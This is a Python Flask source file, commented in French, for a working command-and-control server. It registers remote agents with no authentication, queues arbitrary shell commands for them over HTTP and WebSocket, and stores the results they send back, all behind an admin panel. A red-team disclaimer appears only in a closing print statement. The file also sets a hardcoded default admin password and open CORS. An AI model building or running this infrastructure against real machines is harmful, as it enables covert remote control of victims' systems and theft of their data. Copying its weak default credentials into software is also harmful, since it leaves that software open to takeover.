from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, get_jwt_identity
from flask_socketio import SocketIO, emit, join_room, leave_room
import os
import json
import sqlite3
import hashlib
import secrets
import base64
import threading
import time
from datetime import datetime, timedelta
from werkzeug.security import generate_password_hash, check_password_hash
from cryptography.fernet import Fernet
import uuid
import psutil
from dotenv import load_dotenv

# Charger les variables d'environnement
load_dotenv()

app = Flask(__name__, 
            static_folder='static',
            template_folder='templates')

# Configuration sécurisée
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', secrets.token_hex(32))
app.config['JWT_SECRET_KEY'] = os.getenv('JWT_SECRET_KEY', secrets.token_hex(32))
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = timedelta(hours=24)

# Initialisation des extensions
CORS(app, origins=os.getenv('ALLOWED_ORIGINS', '*').split(','))
jwt = JWTManager(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Base de données
DB_PATH = os.getenv('DB_PATH', 'c2_server.db')

class C2Database:
    def __init__(self, db_path=DB_PATH):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialise la base de données C2"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Table des agents
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                os_info TEXT,
                ip_address TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'active',
                encryption_key TEXT,
                capabilities TEXT
            )
        ''')
        
        # Table des commandes
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                command TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP,
                result TEXT,
                FOREIGN KEY (agent_id) REFERENCES agents (id)
            )
        ''')
        
        # Table des utilisateurs administrateurs
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS admin_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE,
                password_hash TEXT,
                role TEXT DEFAULT 'admin',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_login TIMESTAMP
            )
        ''')
        
        # Table des sessions
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                agent_id TEXT,
                admin_user_id INTEGER,
                session_type TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                data TEXT,
                FOREIGN KEY (agent_id) REFERENCES agents (id),
                FOREIGN KEY (admin_user_id) REFERENCES admin_users (id)
            )
        ''')
        
        # Table des logs d'activité
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activity_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                level TEXT,
                source TEXT,
                message TEXT,
                details TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        
        # Créer un utilisateur admin par défaut
        self.create_default_admin()
    
    def create_default_admin(self):
        """Crée un utilisateur admin par défaut"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Vérifier si un admin existe déjà
        cursor.execute("SELECT COUNT(*) FROM admin_users")
        if cursor.fetchone()[0] == 0:
            # Créer admin par défaut
            default_password = os.getenv('DEFAULT_ADMIN_PASSWORD', 'C2Admin123!')
            password_hash = generate_password_hash(default_password)
            
            cursor.execute('''
                INSERT INTO admin_users (username, password_hash, role)
                VALUES (?, ?, ?)
            ''', ('admin', password_hash, 'superadmin'))
            
            conn.commit()
            print(f"[INIT] Admin par défaut créé - Username: admin, Password: {default_password}")
        
        conn.close()
    
    def log_activity(self, level, source, message, details=None):
        """Enregistre une activité dans les logs"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO activity_logs (level, source, message, details)
            VALUES (?, ?, ?, ?)
        ''', (level, source, message, json.dumps(details) if details else None))
        
        conn.commit()
        conn.close()

# Instance de la base de données
db = C2Database()

class EncryptionManager:
    @staticmethod
    def generate_key():
        """Génère une clé de chiffrement"""
        return Fernet.generate_key()
    
    @staticmethod
    def encrypt_data(data, key):
        """Chiffre des données"""
        if isinstance(data, str):
            data = data.encode()
        f = Fernet(key)
        return f.encrypt(data)
    
    @staticmethod
    def decrypt_data(encrypted_data, key):
        """Déchiffre des données"""
        f = Fernet(key)
        return f.decrypt(encrypted_data).decode()

# Gestionnaire de chiffrement
encryption = EncryptionManager()

# Stockage en mémoire des agents connectés
connected_agents = {}
active_sessions = {}

@app.route('/')
def index():
    """Page d'accueil du C2"""
    return render_template('index.html')

@app.route('/admin')
def admin_panel():
    """Panel d'administration"""
    return render_template('admin.html')

@app.route('/api/auth/login', methods=['POST'])
def login():
    """Authentification des administrateurs"""
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'error': 'Username et password requis'}), 400
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT id, username, password_hash, role 
        FROM admin_users 
        WHERE username = ?
    ''', (username,))
    
    user = cursor.fetchone()
    conn.close()
    
    if user and check_password_hash(user[2], password):
        # Mettre à jour last_login
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE admin_users 
            SET last_login = CURRENT_TIMESTAMP 
            WHERE id = ?
        ''', (user[0],))
        conn.commit()
        conn.close()
        
        # Créer le token JWT
        access_token = create_access_token(
            identity=str(user[0]),
            additional_claims={'username': user[1], 'role': user[3]}
        )
        
        db.log_activity('INFO', 'AUTH', f'Connexion admin réussie: {username}')
        
        return jsonify({
            'access_token': access_token,
            'username': user[1],
            'role': user[3]
        })
    
    db.log_activity('WARNING', 'AUTH', f'Tentative de connexion échouée: {username}')
    return jsonify({'error': 'Credentials invalides'}), 401

@app.route('/api/agents', methods=['POST'])
@jwt_required()
def add_agent_manually():
    """Ajouter manuellement un agent depuis l'interface admin"""
    try:
        data = request.get_json()
        
        # Validation des données requises
        required_fields = ['hostname', 'username', 'os_info', 'ip_address']
        for field in required_fields:
            if not data.get(field):
                return jsonify({'error': f'Champ requis manquant: {field}'}), 400
        
        # Générer un ID unique pour l'agent
        agent_id = str(uuid.uuid4())
        
        # Générer une clé de chiffrement
        encryption_key = encryption.generate_key()
        
        # Enregistrer l'agent
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Vérifier si l'IP existe déjà
        cursor.execute('SELECT id FROM agents WHERE ip_address = ?', (data['ip_address'],))
        existing_agent = cursor.fetchone()
        
        if existing_agent:
            conn.close()
            return jsonify({'error': 'Un agent avec cette IP existe déjà'}), 409
        
        cursor.execute('''
            INSERT INTO agents (id, hostname, username, os_info, ip_address, encryption_key, capabilities, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            agent_id,
            data['hostname'],
            data['username'],
            data['os_info'],
            data['ip_address'],
            base64.b64encode(encryption_key).decode(),
            json.dumps(data.get('capabilities', ['manual_entry'])),
            'manual'  # Statut spécial pour les agents ajoutés manuellement
        ))
        
        conn.commit()
        conn.close()
        
        admin_user = get_jwt_identity()
        db.log_activity('INFO', 'AGENT', f'Agent ajouté manuellement: {agent_id}', {
            'hostname': data['hostname'],
            'ip': data['ip_address'],
            'admin_user': admin_user
        })
        
        return jsonify({
            'success': True,
            'agent_id': agent_id,
            'message': 'Agent ajouté avec succès',
            'agent': {
                'id': agent_id,
                'hostname': data['hostname'],
                'username': data['username'],
                'os_info': data['os_info'],
                'ip_address': data['ip_address'],
                'status': 'manual',
                'capabilities': data.get('capabilities', ['manual_entry'])
            }
        })
        
    except Exception as e:
        return jsonify({'error': f'Erreur lors de l\'ajout: {str(e)}'}), 500

@app.route('/api/agents/<agent_id>', methods=['DELETE'])
@jwt_required()
def delete_agent(agent_id):
    """Supprimer un agent"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Vérifier que l'agent existe
        cursor.execute('SELECT hostname FROM agents WHERE id = ?', (agent_id,))
        agent = cursor.fetchone()
        
        if not agent:
            conn.close()
            return jsonify({'error': 'Agent non trouvé'}), 404
        
        # Supprimer l'agent et ses commandes
        cursor.execute('DELETE FROM commands WHERE agent_id = ?', (agent_id,))
        cursor.execute('DELETE FROM agents WHERE id = ?', (agent_id,))
        
        conn.commit()
        conn.close()
        
        admin_user = get_jwt_identity()
        db.log_activity('INFO', 'AGENT', f'Agent supprimé: {agent_id}', {
            'hostname': agent[0],
            'admin_user': admin_user
        })
        
        return jsonify({
            'success': True,
            'message': 'Agent supprimé avec succès'
        })
        
    except Exception as e:
        return jsonify({'error': f'Erreur lors de la suppression: {str(e)}'}), 500

@app.route('/api/agents', methods=['GET'])
@jwt_required()
def get_agents():
    """Récupère la liste des agents"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT id, hostname, username, os_info, ip_address, 
               first_seen, last_seen, status, capabilities
        FROM agents
        ORDER BY last_seen DESC
    ''')
    
    agents = []
    for row in cursor.fetchall():
        agents.append({
            'id': row[0],
            'hostname': row[1],
            'username': row[2],
            'os_info': row[3],
            'ip_address': row[4],
            'first_seen': row[5],
            'last_seen': row[6],
            'status': row[7],
            'capabilities': json.loads(row[8]) if row[8] else [],
            'online': row[0] in connected_agents
        })
    
    conn.close()
    return jsonify({'agents': agents})

@app.route('/api/agents/<agent_id>/commands', methods=['POST'])
@jwt_required()
def send_command(agent_id):
    """Envoie une commande à un agent"""
    data = request.get_json()
    command = data.get('command')
    
    if not command:
        return jsonify({'error': 'Commande requise'}), 400
    
    # Vérifier que l'agent existe
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('SELECT id FROM agents WHERE id = ?', (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return jsonify({'error': 'Agent non trouvé'}), 404
    
    # Insérer la commande
    cursor.execute('''
        INSERT INTO commands (agent_id, command)
        VALUES (?, ?)
    ''', (agent_id, command))
    
    command_id = cursor.lastrowid
    conn.commit()
    conn.close()
    
    # Envoyer la commande via WebSocket si l'agent est connecté
    if agent_id in connected_agents:
        socketio.emit('new_command', {
            'command_id': command_id,
            'command': command
        }, room=agent_id)
    
    admin_user = get_jwt_identity()
    db.log_activity('INFO', 'COMMAND', f'Commande envoyée à {agent_id}: {command}', {
        'admin_user': admin_user,
        'command_id': command_id
    })
    
    return jsonify({
        'success': True,
        'command_id': command_id,
        'message': 'Commande envoyée'
    })

@app.route('/api/agents/<agent_id>/commands', methods=['GET'])
@jwt_required()
def get_agent_commands(agent_id):
    """Récupère l'historique des commandes d'un agent"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT id, command, status, created_at, executed_at, result
        FROM commands
        WHERE agent_id = ?
        ORDER BY created_at DESC
        LIMIT 100
    ''', (agent_id,))
    
    commands = []
    for row in cursor.fetchall():
        commands.append({
            'id': row[0],
            'command': row[1],
            'status': row[2],
            'created_at': row[3],
            'executed_at': row[4],
            'result': row[5]
        })
    
    conn.close()
    return jsonify({'commands': commands})

@app.route('/api/stats', methods=['GET'])
@jwt_required()
def get_stats():
    """Statistiques du serveur C2"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Nombre total d'agents
    cursor.execute('SELECT COUNT(*) FROM agents')
    total_agents = cursor.fetchone()[0]
    
    # Agents actifs (vus dans les dernières 5 minutes)
    cursor.execute('''
        SELECT COUNT(*) FROM agents 
        WHERE datetime(last_seen) > datetime('now', '-5 minutes')
    ''')
    active_agents = cursor.fetchone()[0]
    
    # Commandes en attente
    cursor.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"')
    pending_commands = cursor.fetchone()[0]
    
    # Commandes exécutées aujourd'hui
    cursor.execute('''
        SELECT COUNT(*) FROM commands 
        WHERE date(created_at) = date('now')
    ''')
    commands_today = cursor.fetchone()[0]
    
    conn.close()
    
    # Statistiques système
    system_stats = {
        'cpu_percent': psutil.cpu_percent(),
        'memory_percent': psutil.virtual_memory().percent,
        'disk_percent': psutil.disk_usage('/').percent,
        'uptime': time.time() - psutil.boot_time()
    }
    
    return jsonify({
        'agents': {
            'total': total_agents,
            'active': active_agents,
            'online': len(connected_agents)
        },
        'commands': {
            'pending': pending_commands,
            'today': commands_today
        },
        'system': system_stats
    })

# ===== ENDPOINTS POUR AGENTS =====

@app.route('/api/agent/register', methods=['POST'])
def register_agent():
    """Enregistrement d'un nouvel agent"""
    data = request.get_json()
    
    # Générer un ID unique pour l'agent
    agent_id = str(uuid.uuid4())
    
    # Générer une clé de chiffrement
    encryption_key = encryption.generate_key()
    
    # Enregistrer l'agent
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT INTO agents (id, hostname, username, os_info, ip_address, encryption_key, capabilities)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (
        agent_id,
        data.get('hostname', ''),
        data.get('username', ''),
        data.get('os_info', ''),
        request.remote_addr,
        base64.b64encode(encryption_key).decode(),
        json.dumps(data.get('capabilities', []))
    ))
    
    conn.commit()
    conn.close()
    
    db.log_activity('INFO', 'AGENT', f'Nouvel agent enregistré: {agent_id}', {
        'hostname': data.get('hostname'),
        'ip': request.remote_addr
    })
    
    return jsonify({
        'agent_id': agent_id,
        'encryption_key': base64.b64encode(encryption_key).decode(),
        'status': 'registered'
    })

@app.route('/api/agent/<agent_id>/checkin', methods=['POST'])
def agent_checkin(agent_id):
    """Check-in d'un agent (heartbeat)"""
    # Mettre à jour last_seen
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        UPDATE agents 
        SET last_seen = CURRENT_TIMESTAMP, status = 'active'
        WHERE id = ?
    ''', (agent_id,))
    
    # Récupérer les commandes en attente
    cursor.execute('''
        SELECT id, command FROM commands 
        WHERE agent_id = ? AND status = 'pending'
        ORDER BY created_at ASC
    ''', (agent_id,))
    
    pending_commands = cursor.fetchall()
    conn.commit()
    conn.close()
    
    commands = [{'id': cmd[0], 'command': cmd[1]} for cmd in pending_commands]
    
    return jsonify({
        'status': 'ok',
        'commands': commands,
        'server_time': datetime.now().isoformat()
    })

@app.route('/api/agent/<agent_id>/result', methods=['POST'])
def submit_result(agent_id):
    """Soumission d'un résultat de commande"""
    data = request.get_json()
    command_id = data.get('command_id')
    result = data.get('result')
    
    # Mettre à jour la commande
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        UPDATE commands 
        SET status = 'completed', executed_at = CURRENT_TIMESTAMP, result = ?
        WHERE id = ? AND agent_id = ?
    ''', (result, command_id, agent_id))
    
    conn.commit()
    conn.close()
    
    # Notifier les admins connectés
    socketio.emit('command_result', {
        'agent_id': agent_id,
        'command_id': command_id,
        'result': result
    }, room='admins')
    
    db.log_activity('INFO', 'RESULT', f'Résultat reçu de {agent_id}', {
        'command_id': command_id
    })
    
    return jsonify({'status': 'received'})

# ===== WEBSOCKET EVENTS =====

@socketio.on('connect')
def handle_connect():
    """Gestion des connexions WebSocket"""
    print(f"Client connecté: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    """Gestion des déconnexions WebSocket"""
    print(f"Client déconnecté: {request.sid}")
    
    # Nettoyer les agents connectés
    for agent_id, session_id in list(connected_agents.items()):
        if session_id == request.sid:
            del connected_agents[agent_id]
            db.log_activity('INFO', 'AGENT', f'Agent déconnecté: {agent_id}')

@socketio.on('join_admin')
@jwt_required()
def handle_join_admin():
    """Rejoindre la room des admins"""
    join_room('admins')
    emit('status', {'message': 'Connecté en tant qu\'admin'})

@socketio.on('join_agent')
def handle_join_agent(data):
    """Rejoindre en tant qu'agent"""
    agent_id = data.get('agent_id')
    if agent_id:
        join_room(agent_id)
        connected_agents[agent_id] = request.sid
        emit('status', {'message': 'Agent connecté'})
        
        # Notifier les admins
        socketio.emit('agent_online', {
            'agent_id': agent_id,
            'timestamp': datetime.now().isoformat()
        }, room='admins')

if __name__ == '__main__':
    print("🚀 Démarrage du serveur C2...")
    print(f"📊 Dashboard admin: http://localhost:5000/admin")
    print(f"🔑 API auth: http://localhost:5000/api/auth/login")
    print(f"⚠️  USAGE LÉGAL UNIQUEMENT - Tests internes et Red Team autorisé")
    
    # Mode développement avec WebSocket
    socketio.run(app, debug=False, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
